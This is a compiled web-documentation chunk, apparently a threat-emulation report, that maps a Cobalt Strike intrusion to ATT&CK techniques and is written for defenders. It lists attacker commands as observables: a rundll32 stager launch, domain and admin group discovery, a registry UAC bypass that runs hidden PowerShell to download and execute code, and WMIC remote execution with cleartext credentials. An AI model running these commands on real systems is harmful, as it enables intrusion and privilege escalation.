\\"ObjectStoreRecoveryUpdateTask2\\"'))))),(0,l.kt)("h3",{id:"threat-actor-used-rundll32-via-an-scheduled-task-to-execute-cobalt-strike-stager-dll-for-command-and-control"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"RunDll32 via an Scheduled Task")," to execute ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike Stager DLL")," for Command And Control."),(0,l.kt)("h4",{id:"tactic-15"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-15"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32")),(0,l.kt)("h4",{id:"behaviors-and-observables-15"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," executed via Scheduled Task"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\rundll32.EXE C:\\\\ProgramData\\\\log.dll helper pov"))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"This is result of the Persistence created before.")),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-to-perform-hands-on-keyboard-discovery-for-discovery"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to perform hands-on-keyboard discovery for Discovery."),(0,l.kt)("h4",{id:"tactic-16"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-16"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.010 - Signed Binary Proxy Execution: Regsvr32"),(0,l.kt)("li",{parentName:"ul"},"T1087.002 - Account Discovery: Domain Account"),(0,l.kt)("li",{parentName:"ul"},"T1069 - Permission Groups Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-16"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.010"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned mstsc.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\mstsc.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for multiple discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user #{user} /#{domain}"))))),(0,l.kt)("h3",{id:"threat-actor-used-regexe-to-attempt-a-known-elevation-control-mechanism-bypass-for-privilege-escalation"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Reg.exe")," to attempt a known Elevation Control Mechanism bypass for Privilege Escalation."),(0,l.kt)("h4",{id:"tactic-17"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Privilege Escalation")),(0,l.kt)("h4",{id:"techniques-17"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1087.002 - Account Discovery: Domain Account"),(0,l.kt)("li",{parentName:"ul"},"T1069 - Permission Groups Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-17"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1548.002",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for registry modification"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C reg add HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command /d \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden iex -c (New-Object Net.Webclient).DownloadString('http://127.0.0.1:3130/')\\\" /f"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1087.002",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned CMD for multiple discovery commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores de dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net group \\"administradores dominio\\" /#{domain}'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup administrators"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net localgroup Administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net Administradoras de grupos locales"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net grupo local administradoras"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C net user"))))),(0,l.kt)("h3",{id:"threat-actor-used-cobalt-strike-for-initiating-command-execution-on-remote-hosts-via-cmd-and-wmic-for-discovery"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," for initiating command execution on remote hosts via ",(0,l.kt)("em",{parentName:"h3"},"CMD")," and ",(0,l.kt)("em",{parentName:"h3"},"WMIC")," for Discovery."),(0,l.kt)("h4",{id:"tactic-18"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-18"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation")),(0,l.kt)("h4",{id:"behaviors-and-observables-18"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003",(0,l.kt)("br",null),"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RunDll32")," spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C wmic  /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'))))),(0,l.kt)("h3",{id:"threat-actor-used-wmic-via-cobalt-strike-to-list-existing-volume-shadow-copies-via-vssadminexe-for-discovery"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"WMIC via Cobalt Strike")," to list existing Volume Shadow Copies via ",(0,l.kt)("em",{parentName:"h3"},"vssadmin.exe")," for Discovery."),(0,l.kt)("h4",{id:"tactic-19"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-19"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation")),(0,l.kt)("h4",{id:"behaviors-and-observables-19"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," spawned ",(0,l.kt)("em",{parentName:"td"},"WMIC")," to execute command on remote host"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic  /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'))))),(0,l.kt)("h3",{id:"threat-actor-used-http-connections-for-command-and-control"},"Threat actor used HTTP connections for Command And Control."),(0,l.kt)("h4",{id:"tactic-20"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-20"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols")),(0,l.kt)("h4",{id:"behaviors-and-observables-20"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Performed multiple network connections."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"116.124.128[.]206"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Performed multiple DNS Query requests to email related domains."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"imap.gmail.com"))))))}u.isMDXComponent=!0}}]);